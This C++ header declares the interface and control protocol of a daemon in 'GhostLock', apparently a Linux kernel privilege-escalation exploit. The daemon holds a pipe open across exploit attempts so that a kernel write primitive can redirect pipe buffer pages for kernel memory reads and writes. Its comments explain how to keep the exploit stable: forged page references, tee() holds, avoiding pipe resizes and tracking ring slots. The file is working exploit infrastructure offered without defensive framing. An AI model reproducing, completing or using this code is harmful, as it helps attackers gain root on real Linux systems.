/*
 * GhostLock — daemonised pipe holder.
 *
 * The pipe-buffer substitution path requires a pipe that is NEVER closed:
 * free_pipe_info() walks every buffer, runs ops->release() and put_page()s
 * tmp_page, and a forged struct page (flags == pc) would then be freed through
 * the wrong zone.  So the pipe lives in a daemon that outlives every exploit
 * attempt:
 *
 *   - first attempt spawns it (double fork + setsid, stdio to /dev/null),
 *   - it creates the pipe once, creates one real anon buffer, then serves a
 *     tiny line protocol on an AF_UNIX socket,
 *   - later attempts (new processes, same boot) just connect and ask it to
 *     read()/write() the pipe after the write primitive has re-pointed
 *     bufs[i].page.
 *
 * Protocol (one line per request, ASCII + hex):
 *   P                      -> "P ok <pid>"
 *   I                      -> "I ok <pid> <read_fd> <write_fd> <ino>"
 *   S <hex>                -> write <hex> into the SELFTEST pipe             -> "S <n> <errno>"
 *   R <len>                -> read <len> from the SELFTEST pipe -> "R <n> <errno> <hexbytes>"
 *   W <hex>                -> write <hex> into the PRIMITIVE pipe (merge path) -> "W <n> <errno>"
 *   A <len>                -> the writer just planted this len in the prim buffer -> "A <len> 0"
 *   X <len>                -> read <len> from the PRIMITIVE pipe; refuses len >= armed -> "X <n> <errno> <hex>"
 *   T <len>                -> tee() the prim buffer into the HOLD pipe (extra page reference)
 *   B <hexpipe> <hexbufs> <hexring> -> cache geometry, cross-check ring vs F_GETPIPE_SZ
 *   G                      -> "G ok <pipe> <bufs> <ring> armed=<n>"
 *
 * Hardening (all four are daemon-side, no address knowledge, no primitive):
 *   1. HOLD pipe + tee(): duplicating the forged buffer takes an extra reference
 *      on its page, so a later release cannot put_page() an arbitrary kernel page
 *      to zero and free it through the wrong zone.
 *   2. F_SETPIPE_SZ is never called (a resize reallocates pipe->bufs and would
 *      invalidate the cached address); the cached ring_size is cross-checked
 *      against F_GETPIPE_SZ on every B.
 *   3. A/X keep an armed-window ledger and refuse to read a full window: a spent
 *      buffer releases and advances tail, shifting every slot still to be patched.
 *   4. The selftest pipe is a separate pipe from the primitive one, so patching
 *      the primitive's page can never corrupt the diagnostic channel.
 *
 * The daemon is deliberately address-agnostic: it never needs to know any
 * kernel address; the substitution happens through the write primitive on the
 * writer side.
 */
#ifndef GHOSTLOCK_PIPE_DAEMON_H
#define GHOSTLOCK_PIPE_DAEMON_H

#include <stddef.h>
#include <stdint.h>

namespace ghostlock::pipe_daemon {

/* Path of the control socket (env GHOSTLOCK_PIPE_SOCK overrides). */
const char *socket_path(void);

/* Connect to the daemon, spawning it (daemonised) when it is not up yet.
 * Returns 0 on success, -1 on failure. Safe to call once per process. */
int ensure(void);

/* 1 when a connection to the daemon is established. */
int connected(void);

/* Simple request/response over the control socket. Returns 0 on success.
 * reply may be NULL. */
int request(const char *line, char *reply, size_t reply_len);

/* Send payload hex (raw bytes are hex-encoded here). */
int request_hex(const char *verb, const uint8_t *data, size_t len,
                char *reply, size_t reply_len);

/* Channel self-test: S -> R, geometry cross-check, over-read guard, tee-hold,
 * and selftest/primitive pipe isolation. Returns 0 when everything holds. */
int selftest(void);

/* --- writer-side helpers ------------------------------------------------- */

/* Record the window the writer just planted in the primitive buffer: len, and
 * the in-page offset (copy_page_to_iter() warns and returns 0 if offset+bytes
 * crosses the page, and a fully-read len releases the buffer + advances tail). */
int prim_arm(size_t len, size_t off);

/* Read up to len (must be < armed) bytes through the primitive pipe. */
int prim_read(size_t len, char *reply, size_t reply_len);

/* Duplicate the primitive buffer into the hold pipe (extra page reference). */
int tee_hold(size_t len);

/* Cache pipe_inode_info / bufs / ring_size; reply carries the F_GETPIPE_SZ
 * cross-check (stale=, mismatch=). */
int cache_geometry(uint64_t pipe_addr, uint64_t bufs_addr, uint64_t ring_size,
                   char *reply, size_t reply_len);

}  // namespace ghostlock::pipe_daemon

#endif  // GHOSTLOCK_PIPE_DAEMON_H
